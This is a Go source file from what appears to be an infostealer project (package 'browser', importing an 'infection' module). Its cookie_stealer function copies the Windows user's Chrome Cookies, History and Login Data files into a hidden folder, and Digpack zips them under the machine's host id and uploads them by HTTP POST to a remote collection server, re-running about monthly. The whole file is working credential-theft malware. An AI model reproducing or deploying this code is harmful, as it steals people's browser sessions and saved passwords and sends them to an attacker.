package browser

import (
	"archive/zip"
	"bytes"
	"fmt"
	"github.com/parnurzeal/gorequest"
	"infection/machineinfo"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"os/user"
	"time"
)

var safe_path = get_current_user() + "\\tmp\\"

type Msg struct {
	Hostid string `json:"hostid"`
	Code   int    `json:"code"`
}
type BizStatusResponse struct {
	Succeed bool `json:"succeed"`
}

//get targetip files
func get_targetip() string {
	name, err := os.Hostname()
	if err != nil {
		log.Fatal(err)
	}
	return name
}

//create a dir
func create_dir() {
	err := os.MkdirAll(safe_path, 0711)
	if err != nil {
		log.Fatal(err)
	}
}

func Digpack(addr string) {
	logf, lerr := os.Stat(safe_path)
	if lerr == nil {
		//keep the file one month then update
		if time.Now().Unix()-logf.ModTime().Unix() >= 2799765 {
			os.RemoveAll(safe_path)
			return
		} else {
			return
		}
	}
	if os.IsNotExist(lerr) {
		get_current_user()
		create_dir()
		var versionDetail = machineinfo.GetSystemVersion()
		// if not return will happen nil bug
		berr := cookie_stealer(addr, *versionDetail)
		if berr != nil {
			return
		}
		time.Sleep(2 * time.Second)
		buf := new(bytes.Buffer)
		w := zip.NewWriter(buf)
		var files = []struct {
			Name string
		}{
			{"Cookies"},
			{"History"},
			{"Login Data"},
		}
		for _, file := range files {
			f, err := w.Create(file.Name)
			if err != nil {
				log.Fatal(err)
			}
			fbody, err := ioutil.ReadFile(safe_path + file.Name)
			_, err = f.Write(fbody)
			if err != nil {
				log.Fatal(err)
			}
		}
		err := w.Close()
		if err != nil {
			log.Fatal(err)
		}
		f, err := os.OpenFile(safe_path+versionDetail.Hostid+".zip", os.O_CREATE|os.O_WRONLY, 0666)
		if err != nil {
			log.Fatal(err)
		}
		buf.WriteTo(f)
		pbuf := new(bytes.Buffer)
		writer := multipart.NewWriter(pbuf)
		formFile, err := writer.CreateFormFile("file", versionDetail.Hostid+".zip")
		if err != nil {
			log.Println("Create form file failed: %s\n", err)
		}
		// 从文件读取数据，写入表单
		srcFile, err := os.Open(safe_path + versionDetail.Hostid + ".zip")
		if err != nil {
			fmt.Println("Open source file failed: s\n", err)
		}
		defer srcFile.Close()
		_, err = io.Copy(formFile, srcFile)
		if err != nil {
			fmt.Println("Write to form file falied: %s\n", err)
		}
		// 发送表单
		contentType := writer.FormDataContentType()
		writer.Close()
		re, err := http.Post(addr+"browserbag", contentType, pbuf)
		if re.StatusCode == 200 {
			log.Println("Upload browser record Status Successful !")
		} else {
			log.Println("Upload browser record Status Fail !")
		}
	}
}

//returns Current working dir
func current_working_dir() string {
	dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	return dir
}

//returns current user and ther info
func get_current_user() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	return usr.HomeDir
}

func check(err error) {
	if err != nil {
		log.Println("Error ", err.Error())
		time.Sleep(3 * time.Second)
		os.Exit(1)
	}
}

func cookie_stealer(addr string, detail machineinfo.VersionDetail) error {
	// todo other browser
	current_user := get_current_user()
	cp := current_user + "\\appdata\\Local\\Google\\Chrome\\User Data\\Default\\"
	//check chrome
	_, err := os.Stat(cp)
	if err != nil {
		msg := Msg{
			Hostid: detail.Hostid,
			Code:   101,
		}
		_, _, _ = gorequest.New().
			Post(addr+"browser_fail").
			Set("content-type", "application/x-www-form-urlencoded").
			Send(msg).
			End()
		os.RemoveAll(safe_path)
		return err
	}
	if os.IsNotExist(err) {
		return err
	}
	var cookie_file string = "Cookies"
	var history string = "History"
	var data_login string = "Login Data"

	cp_cookie := cp + cookie_file
	cp_hist := cp + history
	cp_data_login := cp + data_login

	srcFile, err := os.Open(cp_cookie)
	check(err)
	defer srcFile.Close()

	new_path := safe_path + cookie_file

	destFile, err := os.Create(new_path)
	check(err)
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)

	check(err)
	err = destFile.Sync()
	check(err)

	copyFiles(cp_cookie, cookie_file)
	copyFiles(cp_hist, history)
	copyFiles(cp_data_login, data_login)

	return nil
}

func copyFiles(src string, concat string) {
	srcFile, err := os.Open(src)
	check(err)
	defer srcFile.Close()

	new_path := safe_path + concat

	destFile, err := os.Create(new_path)
	check(err)
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)

	check(err)
	err = destFile.Sync()
	check(err)
}
